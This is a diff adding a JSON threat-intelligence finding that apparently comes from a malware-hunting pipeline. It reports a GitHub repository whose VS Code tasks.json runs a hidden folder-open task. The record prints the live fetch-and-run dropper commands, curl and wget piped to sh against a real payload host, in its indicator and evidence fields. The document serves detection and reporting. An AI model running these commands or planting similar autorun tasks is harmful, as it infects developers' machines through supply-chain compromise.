@@ -1,0 +1,61 @@
+{
+  "finding": {
+    "key": "repository:goldendragon68/nft-marketplace",
+    "kind": "repository",
+    "family": "",
+    "id": "goldendragon68/nft-marketplace",
+    "url": "https://github.com/goldendragon68/NFT-Marketplace",
+    "registry": "github",
+    "owner": "goldendragon68",
+    "status": "confirmed",
+    "confidence": "auto",
+    "score": 5,
+    "detection_method": "malicious_owner",
+    "attribution": "",
+    "campaign_id": "GW-C-a3717cc8",
+    "rules": "install_hook/vscode-autorun",
+    "evidence_locations": ".vscode/tasks.json:0",
+    "c2_hosts": "codeviewer-three.vercel.app",
+    "iocs": "codeviewer-three.vercel.app; https://codeviewer-three.vercel.app/task/mac?token=bc7be3873ca9; https://codeviewer-three.vercel.app/task/linux?token=bc7be3873ca9; curl 'https://codeviewer-three.vercel.app/task/mac?token=bc7be3873ca9' | sh; .vscode/tasks.json",
+    "matched_signatures": "",
+    "reasons": "repository under owner goldendragon68 of a known-malicious repo | Tier-2 confirmed (bash score 5)",
+    "osm_status": "submitted",
+    "osm_threat_id": "d7879355-dc82-402e-a413-811a845b4fee",
+    "first_seen": "hunt-20260807T211618Z",
+    "last_seen": "hunt-20260807T211618Z",
+    "evidence_file": "repositories/goldendragon68_nft-marketplace.json",
+    "reviewer_decision": "",
+    "notes": ""
+  },
+  "evidence": [
+    {
+      "file": ".vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl 'https://codeviewer-three.vercel.app/task/mac?token=bc7be3873ca9' | sh wget -qO- 'https://codeviewer-three.vercel.app/task/linux?token=bc7be3873ca9' | sh curl https://codeviewer-three.vercel.app/"
+    }
+  ],
+  "commit_sha": "ec39906b4f7fc983e4c7f44cf36cb290e5b67b53",
+  "osm_report": {
+    "report_type": "repository",
+    "resource_identifier": "https://github.com/goldendragon68/nft-marketplace",
+    "version_info": "all",
+    "threat_description": "VS Code autorun dropper. Payload in .vscode/tasks.json.\nOutbound: fetch-and-run. It downloads code from codeviewer-three.vercel.app and executes it (.vscode/tasks.json).\nRuns automatically when the folder is opened in VS Code (hidden folderOpen task that fetches and runs a remote script).\nMatches PolinRider / Contagious Interview (DPRK): fake-recruiter coding tasks that run a downloader when opened in VS Code. Payload host: codeviewer-three.vercel.app.\nCampaign GW-C-a3717cc8: one of 20 confirmed repos across 17 accounts sharing the dropper URL shape task/{os}?token=. Payload served from 10 distinct hosts, including codeviewer-three.vercel.app, coreviewer.vercel.app, jerryfox-platform.vercel.app, task-hrec.vercel.app, thopywork.vercel.app.\nAttribution: the tradecraft is consistent with North Korea, but a single signal is a lead rather than an attribution, so we do not attribute it on this evidence alone. Signals: Delivery vector matches Contagious-Interview tradecraft: vscode-folderopen-autorun.\nConfirmed by static analysis; the code was read, never executed.",
+    "payload_description": "Malicious payload found in: .vscode/tasks.json\n- Outbound: fetch-and-run. It downloads code from codeviewer-three.vercel.app and executes it (.vscode/tasks.json).\n- .vscode/tasks.json: VS Code task with runOn: folderOpen; runs the moment the folder is opened, no install or click needed\n- Attacker hosts: codeviewer-three.vercel.app",
+    "publisher": "goldendragon68",
+    "severity_level": "critical",
+    "tags": [
+      "supply-chain",
+      "github-repo",
+      "dprk-consistent-tradecraft",
+      "vscode-folderopen-autorun",
+      "dropper"
+    ],
+    "evidence_references": "https://github.com/goldendragon68/nft-marketplace/blob/ec39906b4f7fc983e4c7f44cf36cb290e5b67b53/.vscode/tasks.json",
+    "verified_iocs": "codeviewer-three.vercel.app\nhttps://codeviewer-three.vercel.app/task/mac?token=bc7be3873ca9\nhttps://codeviewer-three.vercel.app/task/linux?token=bc7be3873ca9\ncurl 'https://codeviewer-three.vercel.app/task/mac?token=bc7be3873ca9' | sh\n.vscode/tasks.json",
+    "contributors": [],
+    "first_seen": "2026-08-07T21:16:18Z",
+    "last_seen": "2026-08-07T21:16:18Z"
+  }
+}
